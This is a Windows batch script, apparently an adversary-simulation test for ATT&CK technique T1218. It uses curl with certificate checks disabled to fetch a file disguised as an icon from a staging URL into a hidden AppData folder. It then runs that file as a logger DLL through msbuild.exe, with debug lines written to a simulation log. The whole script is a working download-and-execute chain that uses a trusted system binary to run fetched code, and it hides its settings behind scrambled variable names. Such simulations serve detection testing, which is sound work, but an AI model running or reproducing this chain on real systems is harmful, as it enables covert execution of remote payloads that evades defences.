@echo off
SETLOCAL EnableDelayedExpansion

REM ===== PLACEHOLDER CONSTANTS (random-named SET variables) =====
SET aBcDeFgH=%APPDATA%\11108\4145d2f0
SET jKlMnOpQ=de166c2b.txt
SET rStUvWxY=https://10.0.0.49/stage/2/icon.png?11108-7
SET zZaAbBcC=ITZEL-S2B
SET dDeEfFgG=11108
SET hHiIjJkK=7
SET lLmMnNoP=%PUBLIC%\\macula-simulations.log

REM ===== TIMESTAMP CACHE =====
SET tsvar=!DATE!/!TIME!

REM ===== DEBUG LOG: HEARTBEAT START =====
echo [!tsvar!][DEBUG][!zZaAbBcC!][!dDeEfFgG!]: heartbeat_start>> "!lLmMnNoP!" 2>nul

REM ===== 1. HEARTBEAT FETCH (curl) =====
curl -k -s -o "!aBcDeFgH!\!jKlMnOpQ!" "!rStUvWxY!"
SET hb_exitcode=!errorlevel!

REM ===== DEBUG LOG: HEARTBEAT COMPLETE =====
echo [!tsvar!][DEBUG][!zZaAbBcC!][!dDeEfFgG!]: heartbeat_complete=!hb_exitcode!>> "!lLmMnNoP!" 2>nul

REM ===== 2. CHANGE DIRECTORY =====
echo [!tsvar!][DEBUG][!zZaAbBcC!][!dDeEfFgG!]: chdir_start>> "!lLmMnNoP!" 2>nul
cd /d "!aBcDeFgH!" >nul 2>&1
echo [!tsvar!][DEBUG][!zZaAbBcC!][!dDeEfFgG!]: chdir_result=!errorlevel!>> "!lLmMnNoP!" 2>nul

REM ===== 3. CREATE .proj FILE FOR MSBUILD =====
echo [!tsvar!][DEBUG][!zZaAbBcC!][!dDeEfFgG!]: proj_create_start>> "!lLmMnNoP!" 2>nul
echo ^<Project/^> > "!aBcDeFgH!\build.proj"
echo [!tsvar!][DEBUG][!zZaAbBcC!][!dDeEfFgG!]: proj_create_complete=!errorlevel!>> "!lLmMnNoP!" 2>nul

REM ===== 4. INVOKE MSBUILD WITH /logger: =====
echo [!tsvar!][DEBUG][!zZaAbBcC!][!dDeEfFgG!]: msbuild_start>> "!lLmMnNoP!" 2>nul
"%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe" "!aBcDeFgH!\build.proj" /logger:"!aBcDeFgH!\!jKlMnOpQ!";MyParameters,Foo >NUL 2>&1
SET msbuild_exit=!errorlevel!
echo [!tsvar!][DEBUG][!zZaAbBcC!][!dDeEfFgG!]: msbuild_result=!msbuild_exit!>> "!lLmMnNoP!" 2>nul

REM ===== 5. LOG TTP RESULT =====
IF !msbuild_exit! EQU 0 (
    set resultvar=OK
    set errorvar=
) ELSE (
    set resultvar=FAIL
    set errorvar=msbuild returned errorlevel !msbuild_exit!
)
echo [!tsvar!][TTP][!zZaAbBcC!][!dDeEfFgG!]: T1218^|System Binary Proxy Execution=!resultvar!:!errorvar!>> "!lLmMnNoP!" 2>nul

ENDLOCAL
exit /b 0